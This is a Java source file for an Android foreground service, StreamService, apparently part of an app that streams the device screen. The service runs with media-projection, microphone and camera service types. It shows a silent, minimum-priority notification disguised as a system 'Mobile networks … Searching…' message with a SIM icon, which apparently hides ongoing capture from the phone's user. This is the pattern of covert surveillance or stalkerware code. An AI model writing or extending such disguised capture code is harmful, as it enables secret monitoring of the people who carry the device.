package com.gls.sim1;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.core.app.NotificationCompat;

public class StreamService extends Service {
    private static volatile StreamService INSTANCE;
    private static volatile boolean READY = false;
    private static final Handler WATCH = new Handler(Looper.getMainLooper());

    public static void requestStart(Context ctx) {
        if (INSTANCE != null) return;
        Context app = ctx.getApplicationContext();
        Intent i = new Intent(app, StreamService.class);
        try {
            if (Build.VERSION.SDK_INT >= 26) app.startForegroundService(i);
            else app.startService(i);
        } catch (Exception ignored) {
        }
    }

    public static boolean awaitForeground(long ms) {
        long deadline = System.currentTimeMillis() + ms;
        while (!READY && System.currentTimeMillis() < deadline) {
            try { Thread.sleep(40); } catch (InterruptedException e) { break; }
        }
        return READY;
    }

    public static void requestStop(Context ctx) {
        StreamService s = INSTANCE;
        if (s == null) return;
        s.stopSelf();
    }

    @Override
    public void onCreate() {
        super.onCreate();
        INSTANCE = this;
        createChannel();
        Notification n = new NotificationCompat.Builder(this, "s1")
                .setContentTitle("Mobile networks")
                .setContentText("Searching…")
                .setSmallIcon(R.drawable.ic_sim1)
                .setOngoing(true)
                .setShowWhen(false)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        int types = 0;
        if (Build.VERSION.SDK_INT >= 30) {
            types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                    | android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    | android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
        } else if (Build.VERSION.SDK_INT >= 29) {
            types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
        }
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(2, n, types);
        } else {
            startForeground(2, n);
        }
        READY = true;
        scheduleWatch();
    }

    private void scheduleWatch() {
        WATCH.postDelayed(new Runnable() {
            @Override public void run() {
                if (INSTANCE == null) return;
                if (!ScreenStreamer.getInstance().anyActive()) {
                    stopSelf();
                    return;
                }
                scheduleWatch();
            }
        }, 3000);
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm.getNotificationChannel("s1") == null) {
                NotificationChannel ch = new NotificationChannel("s1", "Mobile networks", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
        }
    }

    @Override
    public void onDestroy() {
        INSTANCE = null;
        READY = false;
        ScreenStreamer.getInstance().shutdownAll();
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
